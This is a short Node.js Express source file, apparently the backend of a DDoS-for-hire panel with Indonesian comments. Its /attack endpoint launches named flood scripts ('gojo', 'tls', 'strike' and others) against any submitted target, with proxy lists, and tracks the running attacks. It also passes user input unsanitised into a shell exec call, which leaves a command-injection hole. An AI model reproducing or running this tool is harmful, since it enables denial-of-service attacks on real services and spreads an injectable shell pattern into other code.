const express = require('express');
const { exec } = require('child_process');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Array buat nyimpen ongoing attacks
let ongoingAttacks = [];

app.post('/attack', (req, res) => {
    const { target, duration, method } = req.body;

    let command;

    switch (method) {
        case 'gojo':
            command = `node source/gojov5.js ${target} ${duration} 100 10 proxy.txt`;
            break;
        case 'flood':
            command = `node source/flood.js ${target} ${duration}`;
            break;
        case 'tls':
            command = `node source/tls.js ${target} ${duration} 100 10`;
            break;
        case 'strike':
            command = `node source/strike.js ${target} ${duration} 10 90 proxy.txt --full --legit`;
            break;
        case 'spike':
            command = `node source/spike.js ${target} 10 ${duration}`;
            break;
        default:
            return res.json({ success: false, message: 'Invalid method' });
    }

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return res.json({ success: false, message: `Error: ${error.message}` });
        }
        if (stderr) {
            console.error(`Stderr: ${stderr}`);
            return res.json({ success: false, message: `Stderr: ${stderr}` });
        }
        console.log(`Stdout: ${stdout}`);

        // Tambahin ke ongoing attacks
        const attack = { target, duration, method, status: 'running' };
        ongoingAttacks.push(attack);

        res.json({ success: true, attack });
    });
});

app.listen(3000, () => {
    console.log('Server started on port 3000');
});
